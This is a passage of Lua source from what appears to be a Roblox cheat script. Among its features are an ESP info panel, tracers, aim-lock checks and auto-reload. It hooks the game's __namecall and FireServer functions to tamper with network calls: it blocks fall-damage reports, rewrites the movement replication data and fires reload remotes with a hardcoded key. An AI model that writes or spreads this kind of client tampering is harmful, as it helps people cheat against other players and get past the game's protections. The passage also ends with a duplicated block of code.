    bg.Parent = HitLog.Container
    local grad = Instance.new("UIGradient")
    grad.Color = ColorSequence.new(Color3.new(1,1,1))
    grad.Transparency = NumberSequence.new{
        NumberSequenceKeypoint.new(0.00, 1.00), NumberSequenceKeypoint.new(0.20, HitLog.THEME.BgTransparency),
        NumberSequenceKeypoint.new(0.80, HitLog.THEME.BgTransparency), NumberSequenceKeypoint.new(1.00, 1.00),
    }
    grad.Parent = bg
    local pad = Instance.new("UIPadding")
    pad.PaddingLeft  = UDim.new(0, HitLog.THEME.SidePadding)
    pad.PaddingRight = UDim.new(0, HitLog.THEME.SidePadding)
    pad.Parent = bg
    local lbl = Instance.new("TextLabel")
    lbl.Name = "Content"; lbl.AutomaticSize = Enum.AutomaticSize.X
    lbl.Size = UDim2.new(0,0,1,0); lbl.BackgroundTransparency = 1
    lbl.Text = text; lbl.TextColor3 = HitLog.THEME.Color_Secondary
    lbl.TextSize = HitLog.THEME.FontSize; lbl.FontFace = HitLog.THEME.Font
    lbl.RichText = true; lbl.TextXAlignment = Enum.TextXAlignment.Left
    lbl.TextTransparency = 1; lbl.Parent = bg
    table.insert(HitLog.ActiveLogs, bg)
    local ty = (#HitLog.ActiveLogs-1)*(HitLog.THEME.RowHeight+HitLog.THEME.PaddingY)
    bg.Position = UDim2.new(0,-25,0,ty)
    local info = TweenInfo.new(0.5, Enum.EasingStyle.Exponential, Enum.EasingDirection.Out)
    TweenService:Create(bg,  info, {Position = UDim2.new(0,0,0,ty), BackgroundTransparency = 0}):Play()
    TweenService:Create(lbl, info, {TextTransparency = 0}):Play()
    task.delay(HitLog.THEME.Lifetime, function()
        if not bg or not bg.Parent then return end
        local idx = table.find(HitLog.ActiveLogs, bg)
        if idx then table.remove(HitLog.ActiveLogs, idx); AnimateRemoveLog(bg); RecalculateLogPositions() end
    end)
end

local function ProcessHitLog(tName, toolName, dmg, dist, cached)
    local s = string.format("rgb(%d,%d,%d)", 200,200,200)
    local g = string.format("rgb(%d,%d,%d)", 0,255,0)
    local ct = cached and string.format(' <font color="%s">Via Cache</font>', g) or ""
    AddLogEntry(string.format(
        '<font color="%s">Hit </font><font color="%s">%s </font><font color="%s">use </font>'..
        '<font color="%s">%s </font><font color="%s">in the Head for </font>'..
        '<font color="%s">%s </font><font color="%s">damage </font><font color="%s">%sm</font>%s',
        s,g,tName,s,g,toolName,s,g,tostring(dmg),s,g,dist,ct))
end

InitHitLog()

local function CreateTracer(origin, dir)
    if not TR.Enabled then return end
    local a0 = Instance.new("Attachment", Workspace.Terrain); a0.Position = origin
    local a1 = Instance.new("Attachment", Workspace.Terrain); a1.Position = origin + dir.Unit*1000
    local beam = Instance.new("Beam", Workspace.Terrain)
    beam.Texture = "rbxassetid://7071778278"
    beam.Width0, beam.Width1 = TR.Size, TR.Size
    beam.Color = ColorSequence.new(TR.Color)
    beam.Transparency = NumberSequence.new(TR.Alpha)
    beam.Attachment0, beam.Attachment1 = a0, a1
    beam.FaceCamera, beam.LightEmission = true, 1
    Debris:AddItem(a0,4); Debris:AddItem(a1,4); Debris:AddItem(beam,4)
end

local function IsBodyPart(p)
    return p:IsA("BasePart") and
        (p.Name=="Head" or p.Name=="Torso" or p.Name=="Left Arm" or p.Name=="Right Arm" or p.Name=="Left Leg" or p.Name=="Right Leg")
end

local function onCharacterAdded()
    FF_S.BodyProps, FF_S.ToolProps = {}, {}
    OriginalNeckC0, OriginalNeckC1 = nil, nil
    Invis_Track, Invis_SavedCF = nil, nil
    LF.Track1, LF.Track2, LF.Angle = nil, nil, 0
    -- Fly 重生重置
    FLY.Active     = false
    FLY.LastSafeCF = nil
    FLY.PM         = nil
    FLY.PC         = nil
    FLY.AnimTrack  = nil
    FlyRefreshBtn()
end
if LocalPlayer.Character then task.spawn(onCharacterAdded) end
LocalPlayer.CharacterAdded:Connect(onCharacterAdded)

-- FF Tool：装备时等待0.15秒让子部件网络复制完成再上材料
local function OnToolEquipped(tool)
    task.spawn(function()
        task.wait(0.15)
        if not FF_S.ToolEnabled then return end
        if not tool or not tool.Parent then return end
        for _, p in ipairs(tool:GetDescendants()) do
            if p:IsA("BasePart") then
                if not FF_S.ToolProps[p] then
                    FF_S.ToolProps[p] = {Material=p.Material, Color=p.Color}
                end
                p.Material = Enum.Material.ForceField
                p.Color    = FF_S.Color
            end
        end
    end)
end
LocalPlayer.CharacterAdded:Connect(function(char)
    char.ChildAdded:Connect(function(obj)
        if obj:IsA("Tool") then OnToolEquipped(obj) end
    end)
end)
if LocalPlayer.Character then
    LocalPlayer.Character.ChildAdded:Connect(function(obj)
        if obj:IsA("Tool") then OnToolEquipped(obj) end
    end)
end

-- == Namecall Hooks ==
local originalFireServer
originalFireServer = hookfunction(Instance.new("RemoteEvent").FireServer, function(self, ...)
    if NoFallEnabled and self.Name == "__RZDONL" then
        local cs = getcallingscript()
        if cs and cs:IsDescendantOf(game) then return nil end
    end
    return originalFireServer(self, ...)
end)

local oldNamecall
oldNamecall = hookmetamethod(game, "__namecall", function(self, ...)
    local method = getnamecallmethod()
    local args = {...}
    if method == "FireServer" and self == ZF_H then
        if HitSoundSelection ~= "None" and HitSounds[HitSoundSelection] then
            task.spawn(function()
                local s = Instance.new("Sound", Camera); s.SoundId = HitSounds[HitSoundSelection]; s.Volume = 1; s:Play()
                Debris:AddItem(s, 1)
            end)
        end
    end
    if method == "FireServer" and NoFallEnabled and self.Name == "__RZDONL" then
        local cs = getcallingscript()
        if cs and cs:IsDescendantOf(game) then return nil end
    end
    if (HeadMode or HandsModSelection) and method == "FireServer" and self.Name == "MOVZREP" then
        if args[1] and type(args[1]) == "table" and args[1][1] then
            pcall(function()
                if HandsModSelection == "Hands up" then
                    args[1][1][1] = AC.HandsUp1; args[1][1][2] = AC.HandsUp2
                elseif HandsModSelection == "Open hands" then
                    args[1][1][1] = AC.OpenHands; args[1][1][2] = AC.OpenHands
                end
                if HeadMode == "Hide head" then args[1][1][3] = AC.AntiDown end
            end)
        end
    end
    if not checkcaller() then
        if self == ZF_H and method == "FireServer" and args[1] ~= "🧈" then return nil end
        if self == GN_S and method == "FireServer" and TR.Enabled then
            if typeof(args[5]) == "Vector3" and typeof(args[6]) == "table" and args[6][1] then
                task.spawn(CreateTracer, args[5], args[6][1])
            end
        end
    end
    return oldNamecall(self, ...)
end)


-- == Target Info Panel (integrated ESP) ==
local InfoPanelEnabled = false
local InfoPanelGui = nil
local InfoPanelFrame = nil
local InfoPanelAvatar = nil
local InfoPanelName = nil
local InfoPanelDistance = nil
local InfoPanelWeapon = nil
local InfoPanelHealthText = nil
local InfoPanelHealthFill = nil
local InfoPanelTarget = nil
local InfoPanelLastThumb = nil
local InfoPanelLastUpdate = 0

local function CreateInfoPanel()
    if InfoPanelGui and InfoPanelGui.Parent then return end

    InfoPanelGui = Instance.new("ScreenGui")
    InfoPanelGui.Name = "CAT_TargetInfoPanel"
    InfoPanelGui.ResetOnSpawn = false
    InfoPanelGui.IgnoreGuiInset = true
    InfoPanelGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
    InfoPanelGui.DisplayOrder = 999
    InfoPanelGui.Parent = gethui and gethui() or CoreGui

    local shadow = Instance.new("Frame")
    shadow.Name = "Shadow"
    shadow.AnchorPoint = Vector2.new(0.5, 0.5)
    shadow.Position = UDim2.new(0.5, 3, 0.5, 4)
    shadow.Size = UDim2.new(0, 242, 0, 74)
    shadow.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    shadow.BackgroundTransparency = 0.35
    shadow.BorderSizePixel = 0
    shadow.Visible = false
    shadow.ZIndex = 1
    shadow.Parent = InfoPanelGui
    local shadowScale = Instance.new("UIScale")
    shadowScale.Scale = 0.8
    shadowScale.Parent = shadow

    InfoPanelFrame = Instance.new("Frame")
    InfoPanelFrame.Name = "Panel"
    InfoPanelFrame.AnchorPoint = Vector2.new(0.5, 0.5)
    InfoPanelFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
    InfoPanelFrame.Size = UDim2.new(0, 240, 0, 72)
    InfoPanelFrame.BackgroundColor3 = Color3.fromRGB(12, 12, 12)
    InfoPanelFrame.BackgroundTransparency = 0.08
    InfoPanelFrame.BorderColor3 = Color3.fromRGB(65, 65, 65)
    InfoPanelFrame.BorderSizePixel = 2
    InfoPanelFrame.Visible = false
    InfoPanelFrame.ZIndex = 2
    InfoPanelFrame.Active = true
    InfoPanelFrame.Parent = InfoPanelGui

    -- 缩小显示，保持内部布局不变。
    local panelScale = Instance.new("UIScale")
    panelScale.Scale = 0.8
    panelScale.Parent = InfoPanelFrame

    local inner = Instance.new("Frame")
    inner.Name = "Inner"
    inner.Position = UDim2.new(0, 5, 0, 5)
    inner.Size = UDim2.new(1, -10, 1, -10)
    inner.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
    inner.BackgroundTransparency = 0.18
    inner.BorderColor3 = Color3.fromRGB(38, 38, 38)
    inner.BorderSizePixel = 1
    inner.ZIndex = 3
    inner.Parent = InfoPanelFrame

    local titleToggle = Instance.new("TextButton")
    titleToggle.Name = "TitleToggle"
    titleToggle.BackgroundTransparency = 1
    titleToggle.BorderSizePixel = 0
    titleToggle.Text = ""
    titleToggle.Size = UDim2.new(0, 70, 0, 20)
    titleToggle.Position = UDim2.new(0, 5, 0, 3)
    titleToggle.ZIndex = 9
    titleToggle.AutoButtonColor = false
    titleToggle.Parent = inner

    local title = Instance.new("TextLabel")
    title.BackgroundTransparency = 1
    title.Position = UDim2.new(0, 10, 0, 5)
    title.Size = UDim2.new(1, -20, 0, 12)
    title.Text = "Info"
    title.TextColor3 = Color3.fromRGB(220, 220, 220)
    title.FontFace = SilkscreenFont
    title.TextSize = 9
    title.TextXAlignment = Enum.TextXAlignment.Left
    title.ZIndex = 4
    title.Parent = inner
    titleToggle.MouseButton1Click:Connect(ToggleInfoPanelUI)

    InfoPanelAvatar = Instance.new("ImageLabel")
    InfoPanelAvatar.Name = "Avatar"
    InfoPanelAvatar.Position = UDim2.new(0, 10, 0, 21)
    InfoPanelAvatar.Size = UDim2.new(0, 46, 0, 46)
    InfoPanelAvatar.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
    InfoPanelAvatar.BorderColor3 = Color3.fromRGB(75, 75, 75)
    InfoPanelAvatar.BorderSizePixel = 1
    InfoPanelAvatar.ScaleType = Enum.ScaleType.Crop
    InfoPanelAvatar.Image = ""
    InfoPanelAvatar.ImageTransparency = 0
    InfoPanelAvatar.Visible = true
    InfoPanelAvatar.ZIndex = 4
    InfoPanelAvatar.Parent = inner

    local textX = 64
    InfoPanelName = Instance.new("TextLabel")
    InfoPanelName.Name = "Name"
    InfoPanelName.BackgroundTransparency = 1
    InfoPanelName.Position = UDim2.new(0, textX, 0, 20)
    InfoPanelName.Size = UDim2.new(1, -textX - 8, 0, 18)
    InfoPanelName.Text = ""
    InfoPanelName.TextColor3 = Color3.fromRGB(245, 245, 245)
    InfoPanelName.FontFace = SilkscreenFont
    InfoPanelName.TextSize = 9
    InfoPanelName.TextXAlignment = Enum.TextXAlignment.Left
    InfoPanelName.TextTruncate = Enum.TextTruncate.AtEnd
    InfoPanelName.ZIndex = 4
    InfoPanelName.Parent = inner

    InfoPanelDistance = Instance.new("TextLabel")
    InfoPanelDistance.Name = "Distance"
    InfoPanelDistance.BackgroundTransparency = 1
    InfoPanelDistance.Position = UDim2.new(0, textX, 0, 37)
    InfoPanelDistance.Size = UDim2.new(0.48, 0, 0, 14)
    InfoPanelDistance.Text = ""
    InfoPanelDistance.TextColor3 = Color3.fromRGB(190, 190, 190)
    InfoPanelDistance.FontFace = SilkscreenFont
    InfoPanelDistance.TextSize = 8
    InfoPanelDistance.TextXAlignment = Enum.TextXAlignment.Left
    InfoPanelDistance.ZIndex = 4
    InfoPanelDistance.Parent = inner

    InfoPanelWeapon = Instance.new("TextLabel")
    InfoPanelWeapon.Name = "Weapon"
    InfoPanelWeapon.BackgroundTransparency = 1
    InfoPanelWeapon.Position = UDim2.new(0.52, 0, 0, 37)
    InfoPanelWeapon.Size = UDim2.new(0.45, -5, 0, 14)
    InfoPanelWeapon.Text = ""
    InfoPanelWeapon.TextColor3 = Color3.fromRGB(190, 190, 190)
    InfoPanelWeapon.FontFace = SilkscreenFont
    InfoPanelWeapon.TextSize = 8
    InfoPanelWeapon.TextXAlignment = Enum.TextXAlignment.Right
    InfoPanelWeapon.TextTruncate = Enum.TextTruncate.AtEnd
    InfoPanelWeapon.ZIndex = 4
    InfoPanelWeapon.Parent = inner

    local healthBack = Instance.new("Frame")
    healthBack.Name = "HealthBack"
    healthBack.Position = UDim2.new(0, textX, 0, 57)
    healthBack.Size = UDim2.new(1, -textX - 10, 0, 8)
    healthBack.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
    healthBack.BorderColor3 = Color3.fromRGB(20, 20, 20)
    healthBack.BorderSizePixel = 1
    healthBack.ZIndex = 4
    healthBack.Parent = inner

    InfoPanelHealthFill = Instance.new("Frame")
    InfoPanelHealthFill.Name = "Fill"
    InfoPanelHealthFill.Size = UDim2.new(1, 0, 1, 0)
    InfoPanelHealthFill.BackgroundColor3 = Color3.fromRGB(105, 190, 105)
    InfoPanelHealthFill.BorderSizePixel = 0
    InfoPanelHealthFill.ZIndex = 5
    InfoPanelHealthFill.Parent = healthBack

    InfoPanelHealthText = Instance.new("TextLabel")
    InfoPanelHealthText.Name = "HealthText"
    InfoPanelHealthText.BackgroundTransparency = 1
    InfoPanelHealthText.Position = UDim2.new(0, textX, 0, 66)
    InfoPanelHealthText.Size = UDim2.new(1, -textX - 10, 0, 13)
    InfoPanelHealthText.Text = ""
    InfoPanelHealthText.TextColor3 = Color3.fromRGB(185, 185, 185)
    InfoPanelHealthText.FontFace = SilkscreenFont
    InfoPanelHealthText.TextSize = 7
    InfoPanelHealthText.TextXAlignment = Enum.TextXAlignment.Left
    InfoPanelHealthText.ZIndex = 5
    InfoPanelHealthText.Parent = inner

    -- Drag + resize support (mouse + touch).
    -- 使用全局 InputBegan，而不是只监听透明 DragHandle。
    -- 这样点击头像、名字、血条、等级/文字区域等子控件时也能拖动。
    local dragHandle = Instance.new("TextButton")
    dragHandle.Name = "DragHandle"
    dragHandle.BackgroundTransparency = 1
    dragHandle.BorderSizePixel = 0
    dragHandle.Text = ""
    dragHandle.AutoButtonColor = false
    dragHandle.Size = UDim2.new(1, 0, 1, 0)
    dragHandle.Position = UDim2.new(0, 0, 0, 0)
    dragHandle.ZIndex = 1
    dragHandle.Active = false
    dragHandle.Selectable = false
    dragHandle.Parent = InfoPanelFrame

    -- 点击 XF.cc 标题区域：隐藏/显示整个悬浮窗。
    local miniToggle = Instance.new("TextButton")
    miniToggle.Name = "ACccToggle"
    miniToggle.Size = UDim2.new(0, 58, 0, 24)
    miniToggle.Position = UDim2.new(1, -66, 0, 10)
    miniToggle.AnchorPoint = Vector2.new(1, 0)
    miniToggle.BackgroundColor3 = Color3.fromRGB(12, 12, 12)
    miniToggle.BorderSizePixel = 1
    miniToggle.BorderColor3 = Color3.fromRGB(65, 65, 65)
    miniToggle.Text = "XF.cc"
    miniToggle.TextColor3 = Color3.fromRGB(202, 243, 255)
    miniToggle.TextSize = 10
    miniToggle.Font = Enum.Font.GothamBold
    miniToggle.AutoButtonColor = true
    miniToggle.ZIndex = 20
    miniToggle.Visible = false
    miniToggle.Parent = InfoPanelGui

    local function ToggleInfoPanelUI()
        local visible = InfoPanelFrame and InfoPanelFrame.Visible
        if visible then
            InfoPanelFrame.Visible = false
            local shadow = InfoPanelGui:FindFirstChild("Shadow")
            if shadow then shadow.Visible = false end
            miniToggle.Visible = false
        else
            InfoPanelFrame.Visible = true
            local shadow = InfoPanelGui:FindFirstChild("Shadow")
            if shadow then shadow.Visible = true end
            miniToggle.Visible = false
        end
    end

    miniToggle.MouseButton1Click:Connect(ToggleInfoPanelUI)

    local resizeHandle = Instance.new("TextButton")
    resizeHandle.Name = "ResizeHandle"
    resizeHandle.BackgroundTransparency = 1
    resizeHandle.BorderSizePixel = 0
    resizeHandle.Text = "◢"
    resizeHandle.TextColor3 = Color3.fromRGB(202, 243, 255)
    resizeHandle.TextSize = 14
    resizeHandle.Font = Enum.Font.GothamBold
    resizeHandle.TextXAlignment = Enum.TextXAlignment.Right
    resizeHandle.TextYAlignment = Enum.TextYAlignment.Bottom
    resizeHandle.Position = UDim2.new(1, -2, 1, -2)
    resizeHandle.AnchorPoint = Vector2.new(1, 1)
    resizeHandle.Size = UDim2.new(0, 24, 0, 24)
    resizeHandle.ZIndex = 20
    resizeHandle.Active = true
    resizeHandle.Selectable = false
    resizeHandle.Parent = InfoPanelFrame

    local function SyncPanelShadow()
        local sh = InfoPanelGui and InfoPanelGui:FindFirstChild("Shadow")
        if sh then
            sh.Position = UDim2.new(
                InfoPanelFrame.Position.X.Scale, InfoPanelFrame.Position.X.Offset + 3,
                InfoPanelFrame.Position.Y.Scale, InfoPanelFrame.Position.Y.Offset + 4
            )
            sh.Size = UDim2.new(
                InfoPanelFrame.Size.X.Scale, InfoPanelFrame.Size.X.Offset + 2,
                InfoPanelFrame.Size.Y.Scale, InfoPanelFrame.Size.Y.Offset + 2
            )
        end
    end

    local draggingPanel, resizingPanel = false, false
    local dragStart, dragOrigin, resizeStart, resizeOrigin

    local function PointInGui(gui, point)
        if not gui or not gui.Visible then return false end
        local pos, size = gui.AbsolutePosition, gui.AbsoluteSize
        return point.X >= pos.X and point.X <= pos.X + size.X
           and point.Y >= pos.Y and point.Y <= pos.Y + size.Y
    end

    local function BeginPanelDrag(input)
        if not InfoPanelFrame or not InfoPanelFrame.Visible then return end
        if input.UserInputType ~= Enum.UserInputType.MouseButton1
           and input.UserInputType ~= Enum.UserInputType.Touch then return end

        local point = input.Position
        if PointInGui(resizeHandle, point) then
            resizingPanel = true
            draggingPanel = false
            resizeStart = point
            resizeOrigin = InfoPanelFrame.Size
            return
        end

        if PointInGui(InfoPanelFrame, point) then
            draggingPanel = true
            resizingPanel = false
            dragStart = point
            dragOrigin = InfoPanelFrame.Position
        end
    end

    local function UpdatePanelDrag(input)
        if input.UserInputType ~= Enum.UserInputType.MouseMovement
           and input.UserInputType ~= Enum.UserInputType.Touch then return end

        if draggingPanel and dragStart and dragOrigin then
            local d = input.Position - dragStart
            InfoPanelFrame.Position = UDim2.new(
                dragOrigin.X.Scale, dragOrigin.X.Offset + d.X,
                dragOrigin.Y.Scale, dragOrigin.Y.Offset + d.Y
            )
            SyncPanelShadow()
        elseif resizingPanel and resizeStart and resizeOrigin then
            local d = input.Position - resizeStart
            InfoPanelFrame.Size = UDim2.new(
                0, math.clamp(resizeOrigin.X.Offset + d.X, 180, 500),
                0, math.clamp(resizeOrigin.Y.Offset + d.Y, 60, 180)
            )
            SyncPanelShadow()
        end
    end

    local function EndPanelDrag(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1
           or input.UserInputType == Enum.UserInputType.Touch then
            draggingPanel = false
            resizingPanel = false
            dragStart, dragOrigin = nil, nil
            resizeStart, resizeOrigin = nil, nil
        end
    end

    -- 面板本身 + 全局输入双重监听，解决手机触摸无法持续拖动的问题。
    InfoPanelFrame.InputBegan:Connect(BeginPanelDrag)
    InfoPanelFrame.InputChanged:Connect(UpdatePanelDrag)
    UserInputService.InputChanged:Connect(UpdatePanelDrag)
    UserInputService.InputEnded:Connect(EndPanelDrag)

    InfoPanelFrame.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.Touch then
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.Change then
                    UpdatePanelDrag(input)
                elseif input.UserInputState == Enum.UserInputState.End then
                    EndPanelDrag(input)
                end
            end)
        end
    end)
    if sh then
        sh.Position = UDim2.new(InfoPanelFrame.Position.X.Scale, InfoPanelFrame.Position.X.Offset + 3, InfoPanelFrame.Position.Y.Scale, InfoPanelFrame.Position.Y.Offset + 4)
        sh.Size = UDim2.new(InfoPanelFrame.Size.X.Scale, InfoPanelFrame.Size.X.Offset + 2, InfoPanelFrame.Size.Y.Scale, InfoPanelFrame.Size.Y.Offset + 2)
    end

    miniToggle.Visible = false

    -- Small outer strokes, matching the existing ESP style.
    for _, obj in ipairs({InfoPanelFrame, inner, InfoPanelAvatar}) do
        local stroke = Instance.new("UIStroke")
        stroke.Color = Color3.fromRGB(0, 0, 0)
        stroke.Thickness = 1
        stroke.Transparency = 0.25
        stroke.Parent = obj
    end
end

local function SetInfoPanelVisible(visible)
    CreateInfoPanel()
    InfoPanelFrame.Visible = visible
    local shadow = InfoPanelGui:FindFirstChild("Shadow")
    if shadow then shadow.Visible = visible end
    local mini = InfoPanelGui:FindFirstChild("ACccToggle")
    if mini then mini.Visible = false end
end

local function GetTargetWeapon(player)
    local char = player and player.Character
    if not char then return "Weapon: None" end

    local tool = char:FindFirstChildOfClass("Tool")
    if tool then
        return "Weapon: " .. tool.Name
    end

    return "Weapon: None"
end

local function GetInfoPanelTarget()
    local center = Vector2.new(Camera.ViewportSize.X * 0.5, Camera.ViewportSize.Y * 0.5)
    local bestPlayer, bestScreenDist = nil, math.huge

    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= LocalPlayer and player.Character then
            local char = player.Character
            local hum = char:FindFirstChildOfClass("Humanoid")
            local root = char:FindFirstChild("HumanoidRootPart")

            if hum and root and hum.Health > 0 then
                if not espSets.targetOnly or table.find(TargetList, player.Name) ~= nil then
                    local pos, onScreen = Camera:WorldToViewportPoint(root.Position)
                    if onScreen and pos.Z > 0 then
                        local screenDist = (Vector2.new(pos.X, pos.Y) - center).Magnitude
                        if screenDist < bestScreenDist then
                            bestScreenDist = screenDist
                            bestPlayer = player
                        end
                    end
                end
            end
        end
    end

    return bestPlayer
end

local function UpdateInfoPanel()
    if not InfoPanelEnabled then
        SetInfoPanelVisible(false)
        return
    end

    CreateInfoPanel()

    local player = GetInfoPanelTarget()
    if not player or not player.Character then
        InfoPanelTarget = nil
        SetInfoPanelVisible(false)
        return
    end

    local char = player.Character
    local hum = char:FindFirstChildOfClass("Humanoid")
    local root = char:FindFirstChild("HumanoidRootPart")
    if not hum or not root or hum.Health <= 0 then
        InfoPanelTarget = nil
        SetInfoPanelVisible(false)
        return
    end

    InfoPanelTarget = player

    local myChar = LocalPlayer.Character
    local myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
    local distance = myRoot and (myRoot.Position - root.Position).Magnitude or 0

    -- 大名 + 小名
    InfoPanelName.Text = player.DisplayName .. "  (" .. player.Name .. ")"
    InfoPanelDistance.Text = "Distance " .. math.floor(distance) .. " studs"
    InfoPanelWeapon.Text = GetTargetWeapon(player)

    local maxHealth = math.max(hum.MaxHealth, 1)
    local health = math.clamp(hum.Health, 0, maxHealth)
    local ratio = math.clamp(health / maxHealth, 0, 1)

    InfoPanelHealthFill.Size = UDim2.new(ratio, 0, 1, 0)
    InfoPanelHealthText.Text = string.format("HP %d / %d", math.floor(health + 0.5), math.floor(maxHealth + 0.5))

    if ratio > 0.6 then
        InfoPanelHealthFill.BackgroundColor3 = Color3.fromRGB(105, 190, 105)
    elseif ratio > 0.3 then
        InfoPanelHealthFill.BackgroundColor3 = Color3.fromRGB(210, 170, 75)
    else
        InfoPanelHealthFill.BackgroundColor3 = Color3.fromRGB(205, 75, 75)
    end

    -- Retry thumbnail requests until Roblox reports the HeadShot is ready.
    if InfoPanelLastThumb ~= player.UserId then
        InfoPanelLastThumb = player.UserId
        InfoPanelAvatar.Image = ""
        task.spawn(function()
            for _ = 1, 8 do
                if InfoPanelTarget ~= player or not InfoPanelAvatar then return end
                local ok, content, isReady = pcall(function()
                    return Players:GetUserThumbnailAsync(player.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size420x420)
                end)
                if ok and content and content ~= "" and InfoPanelTarget == player then
                    InfoPanelAvatar.Image = content
                    InfoPanelAvatar.ImageTransparency = 0
                    if isReady then return end
                end
                task.wait(0.25)
            end
        end)
    end

    SetInfoPanelVisible(true)
end

local function GetCustomTag(char, tagName, offset)
    local tag = char:FindFirstChild(tagName)
    if not tag then
        local head = char:FindFirstChild("Head")
        local root = char:FindFirstChild("HumanoidRootPart")
        local adorn = head or root
        if not adorn then return nil end
        tag = Instance.new("BillboardGui")
        tag.Name             = tagName
        tag.AlwaysOnTop      = true
        tag.Size             = UDim2.new(0, 200, 0, 36)
        tag.StudsOffset      = Vector3.new(0, 0.6, 0)
        tag.StudsOffsetWorldSpace = Vector3.new(0, 0, 0)
        tag.Enabled          = false
        -- Name row
        local nameL = Instance.new("TextLabel"); nameL.Name = "L"
        nameL.BackgroundTransparency = 1
        nameL.Size     = UDim2.new(1, 0, 0.5, 0)
        nameL.Position = UDim2.new(0, 0, 0, 0)
        nameL.TextColor3 = Color3.new(1,1,1)
        nameL.FontFace   = SilkscreenFont
        nameL.TextSize   = 7
        nameL.TextXAlignment = Enum.TextXAlignment.Center
        local s1 = Instance.new("UIStroke"); s1.Thickness = CONFIG.StrokeThickness
        s1.Color = Color3.new(0,0,0); s1.Parent = nameL
        nameL.Parent = tag
        -- Distance row
        local distL = Instance.new("TextLabel"); distL.Name = "DL"
        distL.BackgroundTransparency = 1
        distL.Size     = UDim2.new(1, 0, 0.5, 0)
        distL.Position = UDim2.new(0, 0, 0.5, 0)
        distL.TextColor3 = Color3.fromRGB(200, 200, 200)
        distL.FontFace   = SilkscreenFont
        distL.TextSize   = 7
        distL.TextXAlignment = Enum.TextXAlignment.Center
        local s2 = Instance.new("UIStroke"); s2.Thickness = CONFIG.StrokeThickness
        s2.Color = Color3.new(0,0,0); s2.Parent = distL
        distL.Parent = tag
        -- FF 标签（右边）
        local ffTag = Instance.new("BillboardGui")
        ffTag.Name          = "CAT_FFTag"
        ffTag.AlwaysOnTop   = true
        ffTag.Size          = UDim2.new(0, 60, 0, 20)
        ffTag.StudsOffset   = Vector3.new(2.5, 0, 0)
        ffTag.Enabled       = false
        local ffL = Instance.new("TextLabel"); ffL.Name = "L"
        ffL.BackgroundTransparency = 1
        ffL.Size     = UDim2.new(1,0,1,0)
        ffL.Text     = "FF"
        ffL.TextColor3 = Color3.new(1,1,1)
        ffL.FontFace   = SilkscreenFont
        ffL.TextSize   = 7
        ffL.TextXAlignment = Enum.TextXAlignment.Center
        local sFF = Instance.new("UIStroke"); sFF.Thickness = CONFIG.StrokeThickness
        sFF.Color = Color3.new(0,0,0); sFF.Parent = ffL
        ffL.Parent  = ffTag
        ffTag.Parent  = char
        ffTag.Adornee = root
        -- HP 标签（左边，和FF对称）
        local hpTag = Instance.new("BillboardGui")
        hpTag.Name          = "CAT_HPTag"
        hpTag.AlwaysOnTop   = true
        hpTag.Size          = UDim2.new(0, 60, 0, 20)
        hpTag.StudsOffset   = Vector3.new(-2.5, 0, 0)
        hpTag.Enabled       = false
        local hpL = Instance.new("TextLabel"); hpL.Name = "L"
        hpL.BackgroundTransparency = 1
        hpL.Size     = UDim2.new(1,0,1,0)
        hpL.TextColor3 = Color3.new(1,1,1)
        hpL.FontFace   = SilkscreenFont
        hpL.TextSize   = 7
        hpL.TextXAlignment = Enum.TextXAlignment.Center
        local sHP = Instance.new("UIStroke"); sHP.Thickness = CONFIG.StrokeThickness
        sHP.Color = Color3.new(0,0,0); sHP.Parent = hpL
        hpL.Parent  = hpTag
        hpTag.Parent  = char
        hpTag.Adornee = root
        tag.Parent  = char
        tag.Adornee = adorn
    end
    return tag
end

local function clearReloadConnections()
    for _, c in pairs(reloadConnections) do c:Disconnect() end
    reloadConnections = {}
end

local function setupTool(tool)
    if not (tool and tool:FindFirstChild("IsGun") and AutoReload) then return end
    local vals = tool:FindFirstChild("Values"); if not vals then return end
    local sa, ssa = vals:FindFirstChild("SERVER_Ammo"), vals:FindFirstChild("SERVER_StoredAmmo")
    local function reload() if AutoReload and ssa and ssa.Value ~= 0 then GN_R:FireServer(tick(),"KLWE89U0",tool) end end
    if ssa then table.insert(reloadConnections, ssa:GetPropertyChangedSignal("Value"):Connect(reload)) end
    if sa  then table.insert(reloadConnections, sa:GetPropertyChangedSignal("Value"):Connect(reload))  end
end

local function ShouldLock()
    if not CL.Enabled then return false end
    local char = LocalPlayer.Character
    local tool = char and char:FindFirstChildOfClass("Tool")
    if not tool or not tool:FindFirstChild("IsGun") then return false end
    local vals = tool:FindFirstChild("Values")
    return vals and vals:FindFirstChild("AimDown") and vals.AimDown.Value == true
end

local function IsVisible(origin, tPart)
    local p = RaycastParams.new()
    p.FilterType = Enum.RaycastFilterType.Exclude
    p.FilterDescendantsInstances = {LocalPlayer.Character, Camera}
    local r = workspace:Raycast(origin, tPart.Position - origin, p)
    return not r or r.Instance:IsDescendantOf(tPart.Parent)
end

local function GetVisibleParts(origin, char)
    local vis = {}
    for _, name in ipairs(CL.TargetParts) do
        local p = char:FindFirstChild(name)
        if p and IsVisible(origin, p) then table.insert(vis, p) end
    end
    return #vis > 0 and vis or {char:FindFirstChild("HumanoidRootPart")}
end

-- 常驻重生监听（只注册一次，永不进 clearReloadConnections）
local autoReloadCharConn = nil

-- 把工具监听绑定到某个角色上
local function AutoReloadBindChar(c)
    if not c then return end
    task.wait(0.15)                              -- 等角色/Tool 完全就绪
    if not AutoReload then return end
    setupTool(c:FindFirstChildOfClass("Tool"))
    table.insert(reloadConnections, c.ChildAdded:Connect(function(o)
        if o:IsA("Tool") then setupTool(o) end
    end))
end

-- 常驻重生监听（只注册一次，永不进 clearReloadConnections）
local autoReloadCharConn = nil

-- 把工具监听绑定到某个角色上
local function AutoReloadBindChar(c)
    if not c then return end
    task.wait(0.15)                              -- 等角色/Tool 完全就绪
    if not AutoReload then return end
    setupTool(c:FindFirstChildOfClass("Tool"))
    table.insert(reloadConnections, c.ChildAdded:Connect(function(o)
        if o:IsA("Tool") then setupTool(o) end
    end))
end

